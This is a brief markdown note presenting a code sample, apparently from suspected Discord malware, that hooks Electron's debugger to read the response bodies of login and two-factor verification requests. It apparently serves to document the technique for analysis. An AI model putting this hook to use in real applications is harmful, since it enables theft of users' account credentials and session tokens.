# Suspicious Discord helper

This sample demonstrates an Electron debugger hook used to intercept auth responses.

```javascript
mainWindow["webContents"]["debugger"].attach("1.3");
mainWindow["webContents"]["debugger"].on("message", async (_evt, method, params) => {
  if (method !== "Network.responseReceived") return;
  if (params.response.url.endsWith("/login") || params.response.url.endsWith("/codes-verification")) {
    await mainWindow["webContents"]["debugger"].sendCommand("Network.getResponseBody", {
      requestId: params.requestId,
    });
  }
});
```
